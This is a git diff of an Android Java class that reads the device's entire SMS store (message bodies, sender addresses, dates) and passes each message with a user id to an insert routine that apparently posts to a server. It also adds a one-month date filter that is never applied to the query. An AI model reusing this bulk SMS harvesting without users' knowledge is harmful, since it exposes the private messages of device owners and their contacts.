@@ -2,17 +2,14 @@ package com.example.androiddatachecker;
 
 
 import android.content.ContentResolver;
-import android.content.Context;
+
 import android.content.ContextWrapper;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
-import android.provider.Telephony;
-import android.support.v4.content.ContentResolverCompat;
-import android.support.v7.app.AppCompatActivity;
 
-import android.telephony.TelephonyManager;
-import android.widget.Toast;
+import android.provider.Telephony;
+import android.support.v7.app.AppCompatActivity;
 
 
 import org.apache.http.HttpEntity;
@@ -27,13 +24,13 @@ import org.apache.http.message.BasicNameValuePair;
 
 import java.io.IOException;
 //<<<<<<< HEAD
+import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.Date;
-//=======
-import java.util.ArrayList;
-//>>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
 import java.util.List;
+import java.util.TimeZone;
 
 public class SaveUserMessage extends AppCompatActivity {
 
@@ -63,28 +60,27 @@ public class SaveUserMessage extends AppCompatActivity {
 
                 return;
             }*/
-//<<<<<<< HEAD
 
+        String where = "date >='" + Where() + "'";
         ContentResolver contentResolver = context.getContentResolver();
         Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
+        int idsms = smsInboxCursor.getColumnIndex("_id");
         int indexBody = smsInboxCursor.getColumnIndex("body");
         int indexAddress = smsInboxCursor.getColumnIndex("address");
         int dat = smsInboxCursor.getColumnIndex("date_sent");
         int typesms = smsInboxCursor.getColumnIndex("type");
-        String varr="non";
-        Toast.makeText(context, "Entrée dans Do ", Toast.LENGTH_LONG).show();
+
 
         if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
         do {
             //Integer.toString(smsInboxCursor.getColumnIndex("address")),
-            varr ="oui";
             Date date = new Date(smsInboxCursor.getLong(dat));
             String formattedDate = new SimpleDateFormat("dd/MM/yyyy").format(date);
             Date heur = new Date(smsInboxCursor.getLong(dat));
             String formattedHeure = new SimpleDateFormat("HH:mm").format(heur);
 
             InsertData(uuid_user,
-                    458,
+                    Integer.parseInt(smsInboxCursor.getString(idsms)),
                     smsInboxCursor.getString(indexBody),
                     TypeSms(smsInboxCursor.getString(typesms)),
                     formattedDate,
@@ -98,7 +94,6 @@ public class SaveUserMessage extends AppCompatActivity {
         } while (smsInboxCursor.moveToNext());
         smsInboxCursor.close();
 
-        Toast.makeText(context,"on sort du do avec"+varr,Toast.LENGTH_LONG).show();
         SaveUserCommonProprety saveUserCommonProprety = new SaveUserCommonProprety(context,uuid_user);
         saveUserCommonProprety.SaveUserCommonPropreties();
 
@@ -200,5 +195,23 @@ public class SaveUserMessage extends AppCompatActivity {
             break;
         }
         return typsms;
+    }
+    private long Where() {
+        Calendar cal = Calendar.getInstance();
+        cal.add(Calendar.MONTH, -1);
+        Date result = cal.getTime();
+
+        String formatString = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(result);
+
+        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
+        sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
+        Date formatTodate = null;
+        try {
+            formatTodate = sdf.parse(formatString);
+        } catch (ParseException e) {
+            e.printStackTrace();
+        }
+        long millis = formatTodate.getTime();
+        return millis;
     }
 }
